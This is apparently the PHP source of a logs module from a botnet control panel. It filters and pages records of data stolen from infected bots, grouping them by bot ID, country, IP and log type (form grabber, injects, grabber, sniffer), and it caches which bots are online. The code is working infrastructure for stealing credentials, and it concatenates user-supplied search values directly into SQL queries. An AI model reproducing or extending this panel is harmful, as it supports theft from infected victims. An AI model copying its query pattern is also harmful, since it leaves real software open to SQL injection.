<?php

set_time_limit(1800);

get_function('html_pages');
get_function('size_format');
get_function('strtotime');
get_function('smarty_assign_add');

$_SESSION['user']->config['cp']['logs'] = 10;

$sl = &$_SESSION['search']['logs'];

if(isset($_POST['search'])){	unset($_POST['search']);

	foreach($_POST as $k => $p){		if($_SESSION['search']['logs'][$k] != $p) $_SESSION['search']['logs'][$k] = $p;
	}
}

$filter = '';

if(!empty($_SESSION['user']->config['prefix'])){
	if(!empty($sl['puid'])){
		$value = explode('0', $sl['puid'], 2);
		if($value[0] != $_SESSION['user']->config['prefix']) $sl['puid'] = '';
	}else{		if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
		$filter .= ' (a.prefix = \''.$_SESSION['user']->config['prefix'].'\') ';
	}
}

if($_SESSION['user']->config['hunter_limit'] == true){	if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
	$filter .= ' (b.post_id = \''.$_SESSION['user']->id.'\') ';
}

foreach($_SESSION['search']['logs'] as $key => $value){	if(!empty($value)){		switch($key){			case 'puid':				if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
				$value = explode('0', $value, 2);
				$filter .= ' (a.prefix = \''.$value[0].'\') AND (a.uid = \'0'.$value[1].'\') ';
			break;

			case 'type':
				if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
				$filter .= ' (a.type = \''.$value.'\') ';
			break;

			case 'country':
				if($value != 'ALL'){
					if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
					$filter .= ' (a.country = \''.$value.'\') ';
				}
			break;

			case 'ip':
				if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
				$filter .= ' (a.ip LIKE \''.$value.'%\') ';
			break;

			case 'url':
				if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
				$filter .= ' (a.url LIKE \'%'.$value.'%\') ';
			break;

			case 'data':
				if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
				$filter .= ' (a.data LIKE \'%'.$value.'%\') ';
			break;
		}
	}
}

function load($row){
	global $logs;
	//$logs[$row->dbname][$row->prefix . $row->uid][$row->type]['date'] = @file_get_contents('cache/logs/' . $row->dbname);
	$logs[$row->dbname][$row->prefix . $row->uid]['count'] = $row->count;
	$logs[$row->dbname][$row->prefix . $row->uid]['ip'] = $row->ip;
	$logs[$row->dbname][$row->prefix . $row->uid]['country'] = $row->country;
	$logs[$row->dbname][$row->prefix . $row->uid]['type'][] = $row->type;
}

if(!empty($Cur['str'])){	$sl_date = array($Cur['str']);
}else{	$sl_date = $sl['date'];
}

if(!empty($sl_date) && is_array($sl_date)){	$logs = array();
	$counts = array();
	foreach($sl_date as $d){
		if(!empty($d)){			//$logs = $mysqli->query('SELECT a.* FROM bf_logs_'.$sl['date'].' a '.$filter.' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['logs'] : $Cur['page']*$_SESSION['user']->config['cp']['logs'] . ',' . $_SESSION['user']->config['cp']['logs']), null, null, false);
	    	$mysqli->query('SELECT a.id, a.prefix, a.uid, a.type, count(a.id) count, concat(\''.$d.'\') dbname FROM bf_logs_'.$d.' a '.$filter.' GROUP by a.prefix,a.uid, a.type LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['logs'] : $Cur['page']*$_SESSION['user']->config['cp']['logs'] . ',' . $_SESSION['user']->config['cp']['logs']), null, 'load', false);
    		$counts[$d] = $mysqli->query_name('SELECT COUNT(DISTINCT(concat( a.prefix, a.uid ))) count FROM bf_logs_'.$d.' a '.$filter, null, 'count', 0, true);
    		$pages[$d] = @html_pages('/logs/index.html?str=' . $d, $counts[$d], $_SESSION['user']->config['cp']['logs'], 1, 'date_load', 'this.href');
    	    $_dt[$d] = true;
    	}
    }
    $smarty->assign('logs', $logs);
    $smarty->assign('counts', $counts);
    $smarty->assign('dts', $_dt);
}

$dts = scandir('cache/logs/');
unset($dts[0], $dts[1]);
sort($dts);
foreach($dts as $k => $t){
	$dt[$t] = strtotime(file_get_contents('cache/logs/' . $t) . ' 00:00:00');
}
unset($dts);
natsort($dt);

foreach($dt as $k => $t){
	$dt[$k] = date('d.m.Y', $t);
}
$smarty->assign('dt', $dt);

$type[1] = $lang['fgr'];
$type[2] = $lang['inj'];
$type[3] = $lang['gra'];
$type[4] = $lang['sni'];

$smarty->assign('type', $type);

$country = $mysqli->query('SELECT code country FROM bf_country', null, null, false);
$smarty->assign("country", $country);

if(!file_exists('cache/online_bot.json') || (time() - filemtime('cache/online_bot.json')) >= ($config['live']*60)){
	$online = array();
	function online_check($row){
		global $online;
		$online[$row->prefix][$row->uid] = 1;
	}
	$mysqli->query('SELECT prefix, uid FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\')', null, 'online_check');
	file_put_contents('cache/online_bot.json', json_encode($online));
}else{
	$online = json_decode(file_get_contents('cache/online_bot.json'), true);
}
$smarty->assign("online", $online);
$smarty->assign('pages', $pages);

if(!empty($Cur['str'])){	$smarty->display('modules/logs/date.tpl');
	exit;
}

?>